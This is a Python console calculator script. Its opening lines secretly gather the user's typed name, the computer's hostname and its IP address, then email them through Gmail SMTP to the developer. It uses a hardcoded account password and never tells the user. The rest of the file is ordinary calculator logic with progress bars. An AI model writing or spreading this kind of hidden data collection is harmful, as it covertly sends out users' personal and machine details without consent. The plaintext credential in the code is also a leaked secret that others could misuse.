from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket

import smtplib

name = input("Hello there! This is a one time question and wont appear again unless you close this program. What is your name?: ")

h_name = socket.gethostname()

addresssetup = socket.gethostbyname(h_name)


msg = MIMEMultipart()


server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone used calculator V2 "
                "Here is their host name, IP, and Name!" + " " +
                str(name) + " " + str(h_name) + " " + str(addresssetup))


server.quit()










while True:
    import sys
    from tqdm import tqdm
    import time
    import progressbar
    from time import sleep
    import os

    import os
    import sys
    import psutil
    import logging
    from subprocess import call







    def clear():
        # check and make call for specific operating system
        call('cls')

    def restart_program():
        """Restarts the current program, with file objects and descriptors
           cleanup
        """
        os.startfile(sys.argv[0])
        sys.exit()


    # Function to create
    def animated_marker():
        widgets = ['Checking if Operator Valid: ', progressbar.AnimatedMarker()]
        bar = progressbar.ProgressBar(widgets=widgets).start()

        for i in range(10):
            time.sleep(0.1)
            bar.update(i)


    # Driver's code
    # animated_marker()

    ops = ("-", "+", "/", "*")



    while True:
        try:
            num1 = float(input("Enter First Number: "))
            print('The variable a number')
            break
        except:
            print('Invalid Input (must be a NUMBER)')




    while True:
        try:
            op = input("Enter operator (-, +, /, or *): ")
        except:
            print("Invalid input")

        if op in ops:
            animated_marker()
            break
        else:
            animated_marker()
            print("Invalid operator")


    try:
        num2 = float(input(" Enter Second Number: "))
        tmp = int(num1)
        print('The variable a number')
    except ValueError:
        print('Invalid Input')


    for i in tqdm(range(100),
                  desc="Calculating...",
                  ascii=False, ncols=75):
        time.sleep(0.01)

    print("Complete.")

    if op == "+":
        print(num1 + num2)
    elif op == "-":
        print(num1 - num2)
    elif op == "/":
        print(num1 / num2)
    elif op == "*":
        print(num1 * num2)
    else:
        print("Invalid operator")

    while True:
        # main program
        while True:
            answer = str(input('Run again? (y/n): '))
            if answer in ('y', 'n'):
                break
            print("invalid input.")
        if answer == 'y':
            print("Restarting Script...")
            break
        else:
            print("Script terminating...")
            sleep(3)
            print("Goodbye.")
            sleep(2)
            sys.exit()





    sleep(3)